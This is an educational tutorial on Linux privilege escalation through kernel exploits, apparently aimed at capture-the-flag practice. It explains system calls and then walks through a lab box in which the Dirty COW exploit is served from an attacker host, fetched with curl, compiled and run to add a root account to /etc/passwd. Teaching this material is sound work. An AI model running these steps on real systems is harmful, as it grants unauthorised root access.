                      ____________________________

                       LINUX PRIVILEGE ESCALATION
                         Using Kernel Exploits

                            Leonardo Tamiano
                      ____________________________


Table of Contents
_________________

1. What is a Kernel?
2. Why using Kernel Exploits?
3. Enumerate Kernel Version
4. A Practical Example
5. References


1 What is a Kernel?
===================

  The `kernel' is one of the lowest software layers found within a
  modern operating system.

  It is used to abstract away the firmware and hardware layers, which
  are complex and difficult to interact with. The kernel therefore acts
  as an abstraction layer on top of which modern software runs.

  ,----
  |     Userspace
  |        ^
  |        |
  |        v
  |      Kernel
  |        ^
  |        |
  |        v
  |     Firmware
  |        ^
  |        |
  |        v
  |     Hardware
  `----

  For example, anytime you have a simple `C' program that prints a
  string, as the one shown below

  ,----
  | // gcc simple.c -o simple && ./simple
  | 
  | #include <stdio.h>
  | 
  | int main(void) {
  |   printf("hello world!\n");
  |   return 0;
  | }
  `----

  Internally this program will make use of `system calls', which are
  APIs implemented by the kernel to interact with the underlying
  machine.

  ,----
  | $ gcc simple.c -o simple && ./simple
  | hello world!
  `----

  To list out the system calls made during the execution of a given
  program, you can use the `strace' command.

  ,----
  | $ strace ./simple
  | execve("./simple", ["./simple"], 0x7ffe6a4bf680 /* 46 vars */) = 0
  | brk(NULL)                               = 0x55b61cf5e000
  | access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
  | openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
  | fstat(3, {st_mode=S_IFREG|0644, st_size=144779, ...}) = 0
  | mmap(NULL, 144779, PROT_READ, MAP_PRIVATE, 3, 0) = 0x74771ba23000
  | close(3)                                = 0
  | openat(AT_FDCWD, "/usr/lib/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
  | read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0`^\2\0\0\0\0\0"..., 832) = 832
  | pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
  | fstat(3, {st_mode=S_IFREG|0755, st_size=1989944, ...}) = 0
  | mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x74771ba21000
  | pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
  | mmap(NULL, 2014064, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x74771b835000
  | mmap(0x74771b859000, 1490944, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x24000) = 0x74771b859000
  | mmap(0x74771b9c5000, 319488, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x190000) = 0x74771b9c5000
  | mmap(0x74771ba13000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1dd000) = 0x74771ba13000
  | mmap(0x74771ba19000, 31600, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x74771ba19000
  | close(3)                                = 0
  | mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x74771b832000
  | arch_prctl(ARCH_SET_FS, 0x74771b832740) = 0
  | set_tid_address(0x74771b832a10)         = 24307
  | set_robust_list(0x74771b832a20, 24)     = 0
  | rseq(0x74771b833060, 0x20, 0, 0x53053053) = 0
  | mprotect(0x74771ba13000, 16384, PROT_READ) = 0
  | mprotect(0x55b61cc41000, 4096, PROT_READ) = 0
  | mprotect(0x74771ba7f000, 8192, PROT_READ) = 0
  | prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=9788*1024, rlim_max=RLIM64_INFINITY}) = 0
  | munmap(0x74771ba23000, 144779)          = 0
  | fstat(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(0x88, 0), ...}) = 0
  | getrandom("\x6a\x7d\x25\x32\xf0\x24\x99\x02", 8, GRND_NONBLOCK) = 8
  | brk(NULL)                               = 0x55b61cf5e000
  | brk(0x55b61cf7f000)                     = 0x55b61cf7f000
  | write(1, "hello world!\n", 13hello world!
  | )          = 13
  | exit_group(0)                           = ?
  | +++ exited with 0 +++
  `----

  Notice the name of some of these system calls

  ,----
  | execve, brk, access, openat, fstat, mmap, close
  | openat, pread64, arch_prctl, set_tid_address, set_robust_list
  | rseq, mprotect, prlimit64, munmap, fstat, getrandom
  | write, exit_group
  `----

  Therefore, it is important to different between code that runs in
  kernel mode, also known as kernel space, and code that runs in user
  mode, also known as user space.


2 Why using Kernel Exploits?
============================

  Since the kernel has to interact with the hardware, code that runs in
  kernel mode has a lot more privileges than code that runs in user
  mode.

  But software is software, and all software can potentially be
  vulnerable. This means that even code that runs in kernel mode can be
  vulnerable.

  A kernel exploit is a malicious code that uses a vulnerability found
  within kernel mode in order to hijack the normal flow of
  execution. This time however what is attacked is the kernel of the
  machine, meaning that the attacker is able to change the underlying
  configuration of the operating system.

  In practice this means that a succesful kernel exploitation can result
  in obtaining a root shell.


3 Enumerate Kernel Version
==========================

  To obtain the kernel version you can use the command `uname'

  ,----
  | $ uname -a
  | Linux hostname 5.15.0-100-generic #110-Ubuntu SMP Wed Feb 7 13:27:48 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
  `----


4 A Practical Example
=====================

  Login into the machine
  ,----
  | ssh -i ./ssh-key hype@10.10.10.79
  `----

  Check kernel version
  ,----
  | hype@Valentine:~$ uname -a
  | Linux Valentine 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux
  `----

  Use `searchsploit' to search for known vulnerabilities
  ,----
  | searchsploit "linux kernel 3.2"
  `----

  Upload the exploit to the remote machine and compile it
  - attacker machine
    ,----
    | searchsploit -m 40839
    | python3 -m http.server 1337
    `----
  - victim machine
  ,----
  | curl http://10.10.14.29:1337/40839.c > 40839.c
  | gcc 40839.c -lpthread -lcrypt -o 40839
  `----

  Execute the kernel exploit
  ,----
  | hype@Valentine:~$ ./40839 
  | /etc/passwd successfully backed up to /tmp/passwd.bak
  | Please enter the new password: 
  | Complete line:
  | firefart:fi1IpG9ta02N.:0:0:pwned:/root:/bin/bash
  | 
  | mmap: 7f7934a13000
  | ^C
  | hype@Valentine:~$ su firefart
  | Password: 
  | firefart@Valentine:/home/hype# whoami
  | firefart
  `----


5 References
============

  Walkthrough by 0xdf
  - <https://0xdf.gitlab.io/2018/07/28/htb-valentine.html>

  On Dirty COW exploitation
  - <https://www.exploit-db.com/exploits/40839>
  - <https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c>
  - <https://tsitsiflora.github.io/dirty-cow/>
